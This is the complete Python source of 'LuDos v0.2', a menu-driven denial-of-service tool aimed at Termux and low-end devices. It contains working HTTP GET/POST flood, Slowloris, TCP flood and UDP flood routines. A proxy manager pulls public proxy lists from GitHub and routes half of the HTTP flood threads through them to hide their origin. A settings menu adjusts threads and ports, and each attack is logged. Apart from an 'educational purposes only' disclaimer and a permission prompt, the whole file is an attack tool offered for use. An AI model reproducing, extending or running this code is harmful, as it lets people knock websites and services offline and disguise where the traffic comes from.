#!/usr/bin/env python3
# LuDos v0.2 - Lightweight DDoS Tool for Termux/Low-End Devices
# Author: Luxifer
# For educational purposes only - Use at your own risk

import os
import sys
import time
import json
import random
import socket
import requests
import threading
import subprocess
import platform
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

# ============ ASCII BANNER ============
BANNER = f"""
{Fore.RED}██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗
{Fore.RED}██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝
{Fore.RED}██████╔╝██║   ██║██║  ██║██║   ██║███████╗
{Fore.RED}██╔══██╗██║   ██║██║  ██║██║   ██║╚════██║
{Fore.RED}██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║
{Fore.RED}╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{Fore.RESET}

{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║         Lightweight DDoS Tool v0.2                            ║
║         Author: Luxifer                                        ║
║         For Low-End Devices & Termux                          ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
"""

# ============ CONFIGURATION ============
VERSION = "0.2"
AUTHOR = "Luxifer"
THREADS = 100  # Default threads (adjustable)
TIMEOUT = 5    # Socket timeout
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
]

# ============ PROXY SOURCES ============
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt"
]

# ============ DIRECTORIES ============
os.makedirs("proxies", exist_ok=True)
os.makedirs("logs", exist_ok=True)

# ============ PROXY MANAGER ============
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.lock = threading.Lock()
    
    def fetch_proxies(self):
        """Fetch proxies from multiple sources"""
        print(f"{Fore.YELLOW}[*] Fetching proxies from {len(PROXY_SOURCES)} sources...{Fore.RESET}")
        
        for source in PROXY_SOURCES:
            try:
                r = requests.get(source, timeout=10)
                if r.status_code == 200:
                    proxies = r.text.strip().split('\n')
                    with self.lock:
                        self.proxies.extend([p.strip() for p in proxies if p.strip()])
                    print(f"{Fore.GREEN}[+] Got {len(proxies)} proxies from {source.split('/')[-1]}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to fetch from {source}{Fore.RESET}")
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"{Fore.GREEN}[+] Total unique proxies: {len(self.proxies)}{Fore.RESET}")
        
        # Save to file
        with open("proxies/all_proxies.txt", 'w') as f:
            f.write('\n'.join(self.proxies))
        
        return self.proxies
    
    def test_proxies(self, test_url="http://httpbin.org/ip", max_workers=30):
        """Test which proxies are working"""
        print(f"{Fore.YELLOW}[*] Testing proxy reliability...{Fore.RESET}")
        
        def test_proxy(proxy):
            try:
                proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                r = requests.get(test_url, proxies=proxy_dict, timeout=5)
                if r.status_code == 200:
                    with self.lock:
                        self.working_proxies.append(proxy)
                        print(f"{Fore.GREEN}[+] Working proxy: {proxy}{Fore.RESET}")
            except:
                pass
        
        # Test first 200 proxies aja biar cepet
        test_list = self.proxies[:200]
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(test_proxy, test_list)
        
        print(f"{Fore.GREEN}[+] Working proxies: {len(self.working_proxies)}{Fore.RESET}")
        
        # Save working proxies
        with open("proxies/working_proxies.txt", 'w') as f:
            f.write('\n'.join(self.working_proxies))
        
        return self.working_proxies
    
    def get_random_proxy(self):
        """Get a random working proxy"""
        if self.working_proxies:
            proxy = random.choice(self.working_proxies)
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        return None

# ============ ATTACK ENGINES ============
class AttackEngine:
    def __init__(self):
        self.target = None
        self.port = 80
        self.threads = THREADS
        self.duration = 60
        self.attack_type = "http"
        self.proxy_manager = ProxyManager()
        self.stats = {
            "requests": 0,
            "bytes_sent": 0,
            "errors": 0,
            "start_time": None
        }
        self.running = False
        self.lock = threading.Lock()
    
    def http_flood(self, use_proxy=True):
        """HTTP GET/POST flood"""
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        
        while self.running:
            try:
                method = random.choice(["GET", "POST"])
                
                if use_proxy:
                    proxies = self.proxy_manager.get_random_proxy()
                else:
                    proxies = None
                
                if method == "GET":
                    r = requests.get(self.target, headers=headers, proxies=proxies, timeout=3)
                else:
                    r = requests.post(self.target, headers=headers, proxies=proxies, timeout=3)
                
                with self.lock:
                    self.stats["requests"] += 1
                    self.stats["bytes_sent"] += len(r.content) if r.content else 0
                    
            except Exception as e:
                with self.lock:
                    self.stats["errors"] += 1
    
    def slowloris(self):
        """Slowloris attack - keeps connections open"""
        sockets = []
        host = self.target.replace("http://", "").replace("https://", "").split('/')[0]
        
        while self.running and len(sockets) < 300:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((host, self.port))
                
                sock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {host}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Accept-language: en-US,en\r\n")
                
                sockets.append(sock)
                
                with self.lock:
                    self.stats["requests"] += 1
                    
            except:
                with self.lock:
                    self.stats["errors"] += 1
        
        # Keep connections alive
        while self.running:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    sockets.remove(sock)
            
            with self.lock:
                self.stats["bytes_sent"] += len(sockets)
            
            time.sleep(10)
    
    def tcp_flood(self):
        """TCP flood"""
        host = self.target.replace("http://", "").replace("https://", "").split('/')[0]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, self.port))
                sock.send(b"GET / HTTP/1.1\r\n\r\n")
                sock.close()
                
                with self.lock:
                    self.stats["requests"] += 1
                    self.stats["bytes_sent"] += 100
                    
            except:
                with self.lock:
                    self.stats["errors"] += 1
    
    def udp_flood(self):
        """UDP flood - very lightweight"""
        host = self.target.replace("http://", "").replace("https://", "").split('/')[0]
        packet = random._urandom(512)  # 512 bytes packet
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet, (host, self.port))
                sock.close()
                
                with self.lock:
                    self.stats["requests"] += 1
                    self.stats["bytes_sent"] += len(packet)
                    
            except:
                with self.lock:
                    self.stats["errors"] += 1
    
    def start_attack(self):
        """Start the attack with selected method"""
        self.running = True
        self.stats["start_time"] = time.time()
        
        # Fetch and test proxies
        if self.attack_type in ["http"]:
            self.proxy_manager.fetch_proxies()
            self.proxy_manager.test_proxies()
        
        threads = []
        
        print(f"{Fore.GREEN}[+] Starting attack with {self.threads} threads{Fore.RESET}")
        
        for i in range(self.threads):
            if self.attack_type == "http":
                use_proxy = (i % 2 == 0)  # Setengah pake proxy, setengah langsung
                t = threading.Thread(target=self.http_flood, args=(use_proxy,))
            elif self.attack_type == "slowloris":
                t = threading.Thread(target=self.slowloris)
            elif self.attack_type == "tcp":
                t = threading.Thread(target=self.tcp_flood)
            elif self.attack_type == "udp":
                t = threading.Thread(target=self.udp_flood)
            
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.05)  # Prevent overwhelming system
        
        # Monitor attack
        start_time = time.time()
        last_requests = 0
        
        while self.running and (time.time() - start_time) < self.duration:
            elapsed = int(time.time() - start_time)
            remaining = self.duration - elapsed
            
            with self.lock:
                rps = self.stats["requests"] - last_requests
                last_requests = self.stats["requests"]
                mb_sent = self.stats["bytes_sent"] / (1024 * 1024)
            
            sys.stdout.write(f"\r{Fore.CYAN}[{elapsed}s/{self.duration}s] "
                           f"Req: {self.stats['requests']} "
                           f"({rps}/s) | "
                           f"Data: {mb_sent:.2f} MB | "
                           f"Errors: {self.stats['errors']}{Fore.RESET}")
            sys.stdout.flush()
            time.sleep(1)
        
        self.running = False
        print(f"\n{Fore.GREEN}[+] Attack finished!{Fore.RESET}")
        
        # Save stats
        self.save_stats()
    
    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        print(f"{Fore.RED}[!] Attack stopped by user{Fore.RESET}")
    
    def save_stats(self):
        """Save attack statistics"""
        stats = {
            "timestamp": datetime.now().isoformat(),
            "target": self.target,
            "attack_type": self.attack_type,
            "duration": self.duration,
            "threads": self.threads,
            "requests": self.stats["requests"],
            "bytes_sent": self.stats["bytes_sent"],
            "errors": self.stats["errors"],
            "requests_per_sec": self.stats["requests"] / self.duration if self.duration > 0 else 0
        }
        
        filename = f"logs/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(stats, f, indent=4)
        
        print(f"{Fore.GREEN}[+] Stats saved to {filename}{Fore.RESET}")

# ============ MENU ============
def show_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    print(f"{Fore.CYAN}MAIN MENU:{Fore.RESET}")
    print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════════════╗")
    print(f"║  {Fore.GREEN}[01]{Fore.RESET} HTTP Flood Attack        {Fore.GREEN}[05]{Fore.RESET} Proxy Manager        ║")
    print(f"║  {Fore.GREEN}[02]{Fore.RESET} Slowloris Attack         {Fore.GREEN}[06]{Fore.RESET} View Stats           ║")
    print(f"║  {Fore.GREEN}[03]{Fore.RESET} TCP Flood                {Fore.GREEN}[07]{Fore.RESET} Settings             ║")
    print(f"║  {Fore.GREEN}[04]{Fore.RESET} UDP Flood                {Fore.GREEN}[99]{Fore.RESET} Exit                 ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Fore.RESET}")
    print()

# ============ PROXY MANAGER MENU ============
def proxy_manager_menu(engine):
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
        
        print(f"{Fore.CYAN}PROXY MANAGER{Fore.RESET}")
        print(f"{Fore.YELLOW}Total proxies: {len(engine.proxy_manager.proxies)}{Fore.RESET}")
        print(f"{Fore.GREEN}Working proxies: {len(engine.proxy_manager.working_proxies)}{Fore.RESET}")
        print()
        print(f"{Fore.CYAN}Options:{Fore.RESET}")
        print("1. Fetch new proxies")
        print("2. Test proxies")
        print("3. Show working proxies")
        print("4. Back to main menu")
        
        choice = input(f"\n{Fore.CYAN}[?] Choice: {Fore.RESET}")
        
        if choice == '1':
            engine.proxy_manager.fetch_proxies()
        elif choice == '2':
            engine.proxy_manager.test_proxies()
        elif choice == '3':
            print(f"{Fore.GREEN}Working proxies:{Fore.RESET}")
            for i, proxy in enumerate(engine.proxy_manager.working_proxies[:20], 1):
                print(f"    {i}. {proxy}")
        elif choice == '4':
            break
        
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")

# ============ SETTINGS MENU ============
def settings_menu(engine):
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
        
        print(f"{Fore.CYAN}SETTINGS{Fore.RESET}")
        print(f"{Fore.YELLOW}Current settings:{Fore.RESET}")
        print(f"    Threads: {engine.threads}")
        print(f"    Timeout: {TIMEOUT}s")
        print(f"    Port: {engine.port}")
        print()
        print(f"{Fore.CYAN}Options:{Fore.RESET}")
        print("1. Set threads (10-500)")
        print("2. Set port")
        print("3. Back to main menu")
        
        choice = input(f"\n{Fore.CYAN}[?] Choice: {Fore.RESET}")
        
        if choice == '1':
            try:
                new_threads = int(input(f"{Fore.YELLOW}[?] Threads (10-500): {Fore.RESET}"))
                if 10 <= new_threads <= 500:
                    engine.threads = new_threads
                    print(f"{Fore.GREEN}[+] Threads set to {new_threads}{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[-] Invalid range{Fore.RESET}")
            except:
                print(f"{Fore.RED}[-] Invalid input{Fore.RESET}")
        elif choice == '2':
            try:
                new_port = int(input(f"{Fore.YELLOW}[?] Port (1-65535): {Fore.RESET}"))
                if 1 <= new_port <= 65535:
                    engine.port = new_port
                    print(f"{Fore.GREEN}[+] Port set to {new_port}{Fore.RESET}")
                else:
                    print(f"{Fore.RED}[-] Invalid port{Fore.RESET}")
            except:
                print(f"{Fore.RED}[-] Invalid input{Fore.RESET}")
        elif choice == '3':
            break
        
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")

# ============ ATTACK SETUP ============
def setup_attack(engine, attack_type):
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    print(f"{Fore.CYAN}[*] Setting up {attack_type} attack{Fore.RESET}")
    print()
    
    # Get target
    target = input(f"{Fore.YELLOW}[?] Target URL/IP: {Fore.RESET}")
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    engine.target = target
    engine.attack_type = attack_type
    
    # Get duration
    try:
        duration = input(f"{Fore.YELLOW}[?] Attack duration (seconds) [60]: {Fore.RESET}")
        engine.duration = int(duration) if duration else 60
        engine.duration = max(10, min(3600, engine.duration))
    except:
        engine.duration = 60
    
    # Confirm
    print(f"\n{Fore.RED}[!] WARNING: This will send traffic to {target}{Fore.RESET}")
    print(f"{Fore.RED}[!] Make sure you have permission!{Fore.RESET}")
    confirm = input(f"\n{Fore.YELLOW}[?] Start attack? (y/N): {Fore.RESET}")
    
    if confirm.lower() == 'y':
        print(f"\n{Fore.GREEN}[+] Starting attack...{Fore.RESET}")
        engine.start_attack()
    else:
        print(f"{Fore.RED}[-] Attack cancelled{Fore.RESET}")

# ============ STATS VIEWER ============
def view_stats():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    logs = sorted([f for f in os.listdir("logs") if f.endswith('.json')], reverse=True)
    
    if not logs:
        print(f"{Fore.YELLOW}[!] No attack logs found{Fore.RESET}")
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        return
    
    print(f"{Fore.CYAN}Recent attacks:{Fore.RESET}")
    for i, log in enumerate(logs[:10], 1):
        try:
            with open(f"logs/{log}", 'r') as f:
                data = json.load(f)
                print(f"{Fore.YELLOW}{i}. {Fore.WHITE}{data['timestamp']} - {data['target']} - {data['requests']} requests{Fore.RESET}")
        except:
            pass
    
    try:
        choice = input(f"\n{Fore.YELLOW}[?] View log number (0 to cancel): {Fore.RESET}")
        if choice.isdigit() and 1 <= int(choice) <= len(logs[:10]):
            with open(f"logs/{logs[int(choice)-1]}", 'r') as f:
                data = json.load(f)
                print(f"\n{Fore.GREEN}Attack details:{Fore.RESET}")
                for key, value in data.items():
                    print(f"    {Fore.YELLOW}{key}: {Fore.WHITE}{value}{Fore.RESET}")
    except:
        pass
    
    input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")

# ============ MAIN ============
def main():
    try:
        # Check Python version
        if sys.version_info < (3, 6):
            print(f"{Fore.RED}[-] Python 3.6+ required{Fore.RESET}")
            sys.exit(1)
        
        engine = AttackEngine()
        
        while True:
            show_menu()
            choice = input(f"\n{Fore.CYAN}[?] Select attack type: {Fore.RESET}")
            
            if choice in ['1', '01']:
                setup_attack(engine, "http")
            elif choice in ['2', '02']:
                setup_attack(engine, "slowloris")
            elif choice in ['3', '03']:
                setup_attack(engine, "tcp")
            elif choice in ['4', '04']:
                setup_attack(engine, "udp")
            elif choice in ['5', '05']:
                proxy_manager_menu(engine)
            elif choice in ['6', '06']:
                view_stats()
            elif choice in ['7', '07']:
                settings_menu(engine)
            elif choice in ['99']:
                print(f"{Fore.RED}\n[!] Exiting LuDos...{Fore.RESET}")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[-] Invalid choice{Fore.RESET}")
            
            input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user{Fore.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Fore.RESET}")
        input(f"\n{Fore.YELLOW}[*] Press Enter to exit...{Fore.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
